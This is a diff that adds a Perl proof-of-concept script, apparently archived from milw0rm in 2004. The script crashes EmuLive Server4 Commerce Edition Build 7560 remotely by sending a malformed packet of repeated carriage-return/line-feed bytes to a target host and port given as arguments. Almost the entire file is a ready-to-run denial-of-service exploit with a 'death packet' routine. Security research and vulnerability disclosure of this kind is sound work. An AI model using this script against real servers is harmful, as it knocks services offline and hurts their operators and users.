@@ -1,0 +1,49 @@
+#!/usr/bin/perl
+##############################################
+# EmuLive Server4 Commerce Edition Build 7560 
+##############################################
+# Remote crash proof of conecpt code. When the 
+# machine running Server4 recieves a malformed
+# request on TCP port 66 it crashes very hard!
+##############################################
+# GulfTech Security   http://www.gulftech.org
+##############################################
+
+use IO::Socket;
+
+unless ($ARGV[0]) 
+{ 
+	die "usage: s4nomore.pl host port"
+}
+
+	printf("==========================================================\n",);
+	printf(" EmuLive Server4 Commerce Edition Build 7560 Remote Crash \n",);
+	printf("==========================================================\n",);
+
+
+	my $host = $ARGV[0];
+	my $port = $ARGV[1];
+
+
+	my $dead = "\x0D\x0A\x0D\x0A\x0D\x0A\x0D\x0A". #\r\n\r\n\r\n\r\n
+			   "\x0D\x0A\x0D\x0A\x0D\x0A\x0D\x0A". #\r\n\r\n\r\n\r\n
+			   "\x0D\x0A\x0D\x0A\x0D\x0A\x0D\x0A". #\r\n\r\n\r\n\r\n
+			   "\x0D\x0A\x0D\x0A\x0D\x0A\x0D\x0A"; #\r\n\r\n\r\n\r\n
+
+
+	my $i = IO::Socket::INET->new( Proto => "tcp",
+							       PeerAddr  => $host,
+								   PeerPort  => $port,
+							       Timeout   => '100',
+							       Type      => SOCK_STREAM,
+							      ) || die("Connect Error");
+
+		printf("[*] Sending Death Packet To %s\n", $host);
+		print $i $dead;	
+		$i->autoflush(1);
+		printf("[*] Host %s Should Now Be Dead\n", $host);
+		printf("[*] Closing Connections And Exiting  \n");
+		close $i;
+		exit;
+
+# milw0rm.com [2004-09-21]
